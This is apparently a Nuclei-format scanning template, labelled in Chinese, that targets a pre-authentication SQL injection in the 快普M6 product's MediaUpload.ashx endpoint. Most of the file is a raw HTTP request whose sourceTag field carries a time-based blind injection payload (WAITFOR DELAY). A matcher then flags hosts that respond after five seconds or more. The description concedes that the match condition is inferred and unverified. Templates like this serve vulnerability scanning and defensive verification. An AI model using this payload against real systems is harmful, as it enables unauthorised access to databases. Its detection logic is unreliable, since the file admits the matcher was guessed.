id: poc-zhtv75n6hi6qqpeu
info:
  name: 快普M6 前台SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /ashx/Common/MediaUpload.ashx HTTP/1.1


    Cache-Control: max-age=0


    Upgrade-Insecure-Requests: 1


    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


    Accept-Encoding: gzip, deflate


    Accept-Language: zh-CN,zh;q=0.9


    Connection: close


    Content-Type: application/x-www-form-urlencoded


    upload=check&dasdsa=1&sourceTag=11'');WAITFOR DELAY ''0:0:5''--&field=1


    # 响应代码特征

    200


    # 响应内容特征

    暂无


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
